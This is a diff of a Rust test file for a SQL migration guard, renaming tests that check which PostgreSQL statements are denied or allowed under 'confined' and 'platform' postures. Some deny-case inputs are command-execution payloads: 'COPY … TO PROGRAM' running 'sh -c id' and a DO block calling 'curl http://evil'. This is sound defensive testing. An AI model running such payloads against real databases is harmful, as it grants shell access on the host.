@@ -577,7 +577,7 @@ fn assert_profile_decisions(
 
 /// The lock pins what the two postures decide about the statement at this site.
 #[test]
-fn m2_stage2_site_459_copy_program_behavior_lock() {
+fn copy_to_program_is_denied_under_both_postures() {
     assert_profile_decisions(
         "site :459 COPY … TO PROGRAM",
         "COPY zero_migrate.t TO PROGRAM 'sh -c id'",
@@ -587,7 +587,7 @@ fn m2_stage2_site_459_copy_program_behavior_lock() {
 }
 
 #[test]
-fn m2_stage2_site_655_create_role_behavior_lock() {
+fn create_role_is_denied_under_confined_and_allowed_under_platform() {
     assert_profile_decisions(
         "site :655 create role",
         "CREATE ROLE zero_migrate_auth NOLOGIN",
@@ -597,7 +597,7 @@ fn m2_stage2_site_655_create_role_behavior_lock() {
 }
 
 #[test]
-fn m2_stage2_site_664_alter_role_behavior_lock() {
+fn alter_role_is_denied_under_confined_and_allowed_under_platform() {
     assert_profile_decisions(
         "site :664 alter role",
         "ALTER ROLE zero_migrate_auth LOGIN",
@@ -607,7 +607,7 @@ fn m2_stage2_site_664_alter_role_behavior_lock() {
 }
 
 #[test]
-fn m2_stage2_site_670_role_set_and_drop_behavior_lock() {
+fn role_set_and_drop_are_denied_under_confined_and_allowed_under_platform() {
     for sql in [
         "ALTER ROLE zero_migrate_app SET search_path = zero_migrate, public",
         "DROP ROLE IF EXISTS zero_migrate_app",
@@ -622,7 +622,7 @@ fn m2_stage2_site_670_role_set_and_drop_behavior_lock() {
 }
 
 #[test]
-fn m2_stage2_site_682_grant_stmt_behavior_lock() {
+fn grant_statement_is_denied_under_confined_and_allowed_under_platform() {
     assert_profile_decisions(
         "site :682 grant stmt",
         "GRANT CONNECT ON DATABASE zero_migrate TO zero_migrate_app",
@@ -632,7 +632,7 @@ fn m2_stage2_site_682_grant_stmt_behavior_lock() {
 }
 
 #[test]
-fn m2_stage2_site_691_grant_role_stmt_behavior_lock() {
+fn grant_role_membership_is_denied_under_confined_and_allowed_under_platform() {
     assert_profile_decisions(
         "site :691 grant role stmt",
         "GRANT zero_migrate_app TO zero_migrate_worker",
@@ -642,7 +642,7 @@ fn m2_stage2_site_691_grant_role_stmt_behavior_lock() {
 }
 
 #[test]
-fn m2_stage2_site_700_alter_default_privileges_behavior_lock() {
+fn alter_default_privileges_is_denied_under_confined_and_allowed_under_platform() {
     assert_profile_decisions(
         "site :700 alter default privileges",
         "ALTER DEFAULT PRIVILEGES IN SCHEMA zero_migrate GRANT SELECT ON TABLES TO zero_migrate_app",
@@ -652,7 +652,7 @@ fn m2_stage2_site_700_alter_default_privileges_behavior_lock() {
 }
 
 #[test]
-fn m2_stage2_site_798_drop_stmt_behavior_lock() {
+fn platform_drop_object_statements_are_denied_under_confined_and_allowed_under_platform() {
     for sql in [
         "DROP POLICY IF EXISTS tenant_isolation ON zero_migrate.app_secrets",
         "DROP SCHEMA IF EXISTS public CASCADE",
@@ -668,7 +668,7 @@ fn m2_stage2_site_798_drop_stmt_behavior_lock() {
 }
 
 #[test]
-fn m2_stage2_site_821_create_schema_behavior_lock() {
+fn create_schema_is_denied_under_confined_and_allowed_under_platform() {
     assert_profile_decisions(
         "site :821 create schema",
         "CREATE SCHEMA IF NOT EXISTS public",
@@ -678,7 +678,7 @@ fn m2_stage2_site_821_create_schema_behavior_lock() {
 }
 
 #[test]
-fn m2_stage2_site_829_create_policy_behavior_lock() {
+fn create_policy_is_denied_under_confined_and_allowed_under_platform() {
     assert_profile_decisions(
         "site :829 create policy",
         "CREATE POLICY tenant_isolation ON zero_migrate.app_secrets USING (true)",
@@ -688,7 +688,7 @@ fn m2_stage2_site_829_create_policy_behavior_lock() {
 }
 
 #[test]
-fn m2_stage2_site_836_drop_owned_behavior_lock() {
+fn drop_owned_is_denied_under_confined_and_allowed_under_platform() {
     assert_profile_decisions(
         "site :836 drop owned",
         "DROP OWNED BY zero_migrate_auth",
@@ -698,7 +698,7 @@ fn m2_stage2_site_836_drop_owned_behavior_lock() {
 }
 
 #[test]
-fn m2_stage2_site_900_rls_alter_table_behavior_lock() {
+fn enabling_row_level_security_is_denied_under_confined_and_allowed_under_platform() {
     assert_profile_decisions(
         "site :900 RLS alter table",
         "ALTER TABLE zero_migrate.app_secrets ENABLE ROW LEVEL SECURITY",
@@ -708,7 +708,7 @@ fn m2_stage2_site_900_rls_alter_table_behavior_lock() {
 }
 
 #[test]
-fn m2_stage2_site_1209_body_role_needles_behavior_lock() {
+fn do_block_role_needles_are_denied_under_confined_and_allowed_under_platform() {
     assert_profile_decisions(
         "site :1209 body role needles",
         "DO $$ BEGIN PERFORM 'create role hidden'; END $$",
@@ -718,7 +718,7 @@ fn m2_stage2_site_1209_body_role_needles_behavior_lock() {
 }
 
 #[test]
-fn m2_stage2_site_1209_raw_island_body_backstop_behavior_lock() {
+fn raw_body_backstop_denies_role_and_search_path_needles_under_confined() {
     let body = "BEGIN PERFORM 'not sql create role hidden'; PERFORM 'touch search_path'; END;";
     assert_eq!(
         raw_body_backstop_decision(&confined_guard_config(), body),
@@ -736,7 +736,7 @@ fn m2_stage2_site_1209_raw_island_body_backstop_behavior_lock() {
 }
 
 #[test]
-fn m2_stage2_superuser_belt_sites_stay_hard_denied() {
+fn superuser_constructs_stay_denied_under_both_postures() {
     for (site, sql, expected_rule) in [
         (
             "site :651 create role SUPERUSER",
@@ -776,7 +776,7 @@ fn m2_stage2_superuser_belt_sites_stay_hard_denied() {
 /// The boundary that IS pinned is the unforgeable `EffectivePolicy`, held by the
 /// `compile_fail` doctests in `zeroship_migrate_backend::guard`.
 #[test]
-fn t11_platform_posture_is_carried_by_the_composed_policy() {
+fn platform_posture_is_carried_by_the_composed_policy() {
     // The operator keeps an explicit target alongside its capability grants.
     let gcfg = GuardConfig::from_policy(
         crate::support::operator_no_inject("zero_migrate"),
@@ -801,7 +801,7 @@ fn t11_platform_posture_is_carried_by_the_composed_policy() {
 // ---- Platform widening is correct AND bounded ----------------------
 
 #[test]
-fn t4_platform_allows_privileged_constructs() {
+fn platform_allows_privileged_constructs() {
     let g = platform_guard();
     let allowed = [
         // role mgmt
@@ -846,7 +846,7 @@ fn t4_platform_allows_privileged_constructs() {
 }
 
 #[test]
-fn t4_platform_still_denies_rce_and_host_escape() {
+fn platform_still_denies_rce_and_host_escape() {
     let g = platform_guard();
     let denied = [
         // RCE / host escape — kept hard in BOTH profiles
@@ -895,7 +895,7 @@ const PLATFORM_ROLE_DO: &str = "DO $$
     $$;";
 
 #[test]
-fn t4b_do_block_privileged_ddl_applies_under_platform() {
+fn platform_allows_a_do_block_with_privileged_ddl() {
     let g = platform_guard();
     assert!(
         g.check(BOOTSTRAP_DO).is_ok(),
@@ -910,7 +910,7 @@ fn t4b_do_block_privileged_ddl_applies_under_platform() {
 }
 
 #[test]
-fn t4b_neg_do_block_privileged_ddl_denied_under_confined() {
+fn confined_denies_a_do_block_with_privileged_ddl() {
     let g = confined_guard();
     assert!(
         is_denied(&g, BOOTSTRAP_DO),
@@ -923,7 +923,7 @@ fn t4b_neg_do_block_privileged_ddl_denied_under_confined() {
 }
 
 #[test]
-fn t4b_neg_do_block_rce_denied_even_under_platform() {
+fn platform_still_denies_a_do_block_rce() {
     let g = platform_guard();
     let rce_do = "DO $$ BEGIN
         EXECUTE 'COPY zero_migrate.t FROM PROGRAM ''curl http://evil''';
@@ -1251,7 +1251,7 @@ fn benign_vendor_policy_is_refused_at_lower_without_capability() {
 // ---- SchemaScope Single is byte-identical at the read sites ---------
 
 #[test]
-fn t2_func_def_target_single_is_byte_identical() {
+fn single_scope_func_def_target_is_byte_identical() {
     let g = confined_guard(); // Single("zero_migrate")
                               // own-schema funcname → OK; foreign funcname → CrossSchema.
     assert!(g
@@ -1268,7 +1268,7 @@ fn t2_func_def_target_single_is_byte_identical() {
 }
 
 #[test]
-fn t2_literal_schema_refs_single_is_byte_identical() {
+fn single_scope_literal_schema_refs_are_byte_identical() {
     let g = confined_guard(); // Single("zero_migrate")
     assert!(matches!(
         g.check("SELECT 'control.t'::regclass"),
@@ -1283,7 +1283,7 @@ fn t2_literal_schema_refs_single_is_byte_identical() {
 }
 
 #[test]
-fn t2_platform_func_def_and_literal_refs_respect_allowlist() {
+fn platform_func_def_and_literal_refs_respect_allowlist() {
     let g = platform_guard(); // Allowlist(zero_migrate, public)
                               // allowlisted schema → OK
     assert!(g
